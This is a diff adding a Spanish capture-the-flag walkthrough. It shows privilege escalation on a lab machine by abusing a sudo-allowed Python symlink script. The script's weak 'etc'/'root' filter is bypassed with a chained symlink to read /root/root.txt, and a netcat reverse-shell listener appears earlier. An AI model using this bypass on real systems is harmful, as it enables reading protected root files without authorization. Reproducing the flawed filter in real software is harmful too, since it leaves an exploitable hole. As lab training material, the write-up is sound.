@@ -220,3 +220,111 @@ me pongo en escucha por el puerto 4444
 sudo nc -lvnp 4444
 ```
 y ya soy el usuario pablo.
+
+compruebo que puedo ejecutar con privilegios sudo:
+```bash
+sudo -l
+```
+```
+(ALL) NOPASSWD: /usr/bin/python3 /opt/nllns/clean_symlink.py *.jpg
+```
+compruebo si tengo acceso al script /opt/nllns/clean_symlink.py
+```bash
+ls -la /opt/nllns/clean_symlink.py
+```
+```
+-rwxr-xr-x 1 root root 1007 Apr 26 14:13 /opt/nllns/clean_symlink.py
+```
+puedo leerlo, vamos a ver que puede hacer:
+```bash
+cat /opt/nllns/clean_symlink.py
+```
+```
+#!/usr/bin/env python3
+
+import os
+import sys
+import shutil
+
+QUAR_DIR = "/var/quarantined"
+
+if len(sys.argv) != 2:
+    print("¡Se requiere un argumento: el enlace simbólico a un archivo .jpg!")
+    sys.exit(1)
+
+LINK = sys.argv[1]
+
+if not LINK.endswith('.jpg'):
+    print("¡El primer argumento debe ser un archivo .jpg!")
+    sys.exit(2)
+
+if os.path.islink(LINK):
+    LINK_NAME = os.path.basename(LINK)
+    LINK_TARGET = os.readlink(LINK)
+
+    if 'etc' in LINK_TARGET or 'root' in LINK_TARGET:
+        print(f"¡Intentando leer archivos críticos, eliminando enlace [{LINK}]!")
+        os.unlink(LINK)
+    else:
+        print(f"Enlace encontrado [{LINK}], moviéndolo a cuarentena.")
+        shutil.move(LINK, os.path.join(QUAR_DIR, LINK_NAME))
+        if os.path.exists(os.path.join(QUAR_DIR, LINK_NAME)):
+            print("Contenido:")
+            with open(os.path.join(QUAR_DIR, LINK_NAME), 'r') as f:
+                print(f.read())
+else:
+    print(f"El enlace [{LINK}] no es un enlace simbólico.")
+```
+basicamente se le pasa un archivo, verifica que termine en .jpg y sino sale, comprueba que sea un enlace simbolico, extrae el nombre, mira donde apunta, y esta parte nos va a dar problemas:
+````
+  if 'etc' in LINK_TARGET or 'root' in LINK_TARGET:
+        print(f"¡Intentando leer archivos críticos, eliminando enlace [{LINK}]!")
+        os.unlink(LINK)
+```
+porque si contiene "etc" o "root" nos lo va a eliminar, de pasar el filtro lo pasa a la carpeta cuarentena y luego intyenta abrir el archivo
+Si investigamos un poco la carpeta del Home de pablo vamos a ver una cosa interesante:
+```bash
+cd Documents/
+ls -la
+```
+```
+drwxrwxr-x 1 pablo pablo 4096 May  2 18:11 .
+drwxr-x--- 1 pablo pablo 4096 May  2 18:11 ..
+-rw-r--r-- 1 root  root    25 Apr 26 13:32 importante.txt
+```
+```bash
+cat importante.txt
+```
+```
+revisa el /root/root.txt
+```
+
+con todo lo que tenemos solo se me ocurre hacer un enlace simbolico de /root/root.txt y hacer un enlace a ese enlace para ver si me puedo saltar
+la revicion de que contenga "root"
+me voy a tmp;
+```bash
+cd /tmp
+```
+creo una carpeta:
+```bash
+mkdir /tmp/fake
+```
+hago un enlace simbolico
+```bash
+ln -s /root/root.txt /tmp/fake/file.jpg
+```
+hago un enlace del enlace xD
+```bash
+ln -s /tmp/fake/file.jpg indirecto.jpg
+```
+/tmp/fake/file.jpg sí contiene la palabra "root", pero indirecto.jpg apunta a una ruta que no la contiene directamente.
+ejecuto el script:
+```bash
+sudo /usr/bin/python3 /opt/nllns/clean_symlink.py indirecto.jpg
+```
+```
+Enlace encontrado [indirecto.jpg], moviéndolo a cuarentena.
+Contenido:
+prueba esta password, si no es esta entonces estamos jodidos: yhgjhbjxhdbkadkcnkhalkmlk===kjjh
+```
+ahora tenemos un hash....
